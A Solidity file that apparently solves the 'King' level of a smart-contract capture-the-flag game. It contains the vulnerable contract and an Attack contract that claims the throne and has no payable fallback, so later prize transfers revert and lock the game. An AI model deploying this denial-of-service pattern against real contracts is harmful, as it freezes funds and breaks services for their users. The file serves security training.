// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
    address payable king;
    uint256 public prize;
    address payable public owner;

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract Attack {
    King level9 = King(0xEAF7f88E22cb53F2081bE7962AE2A4f53d3A9e05);

    constructor() public payable {
        (bool sent, ) = address(level9).call{value: level9.prize()}("");
        require(sent, "couldn't transfer prize money to the contract");
    }
}
